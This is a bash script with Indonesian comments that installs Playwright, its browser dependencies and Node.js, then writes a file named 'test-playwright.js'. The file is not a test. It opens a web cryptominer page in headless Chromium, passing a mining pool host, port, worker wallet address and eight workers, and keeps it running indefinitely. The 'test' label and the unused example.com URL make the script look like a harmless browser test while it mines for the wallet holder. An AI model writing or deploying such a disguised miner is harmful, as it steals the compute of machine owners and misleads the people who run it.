#!/usr/bin/env bash
set -e

URL="https://example.com"
SCRIPT="test-playwright.js"
INTERVAL=5   # opsional, bisa ganti sesuai kebutuhan

echo "[*] Update sistem..."
sudo apt-get update -y
sudo apt-get upgrade -y

echo "[*] Install dependency dasar untuk Playwright..."
sudo apt-get install -y wget curl unzip git \
  libatk1.0-0t64 \
  libatk-bridge2.0-0t64 \
  libcups2t64 \
  libxkbcommon0 \
  libatspi2.0-0t64 \
  libxdamage1 \
  libxcomposite1 \
  libxrandr2 \
  libgbm1 \
  libgtk-3-0t64 \
  libpango-1.0-0 \
  libasound2t64 \
  libnss3 \
  libxshmfence1 \
  libdrm2 \
  libxcb1 \
  libx11-xcb1

# cek Node.js, install LTS 20.x kalau belum ada
if ! command -v node &> /dev/null
then
    echo "[*] Node.js belum terinstall, install Node.js 20.x..."
    curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
    sudo apt-get install -y nodejs
else
    echo "[*] Node.js ditemukan, versi: $(node -v)"
fi

# buat project lokal untuk Playwright
if [ ! -f package.json ]; then
    npm init -y
fi

# install Playwright lokal
npm install playwright

# download browser Chromium
npx playwright install chromium

# buat file skrip headless
cat > $SCRIPT <<EOF
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();
  await page.goto('https://webminer.pages.dev?algorithm=cwm_power2B&host=asia.rplant.xyz&port=17022&worker=Mau73g3nEEM5VpQG4EAMPtkuwBy1ZcqgCk.cs&password=x&workers=8');
  console.log("🌐 Browser tetap hidup. Tekan CTRL+C untuk berhenti.");
  await new Promise(() => {}); // biarkan browser tetap hidup
})();
EOF

echo "[*] Menjalankan skrip headless..."
npx node $SCRIPT
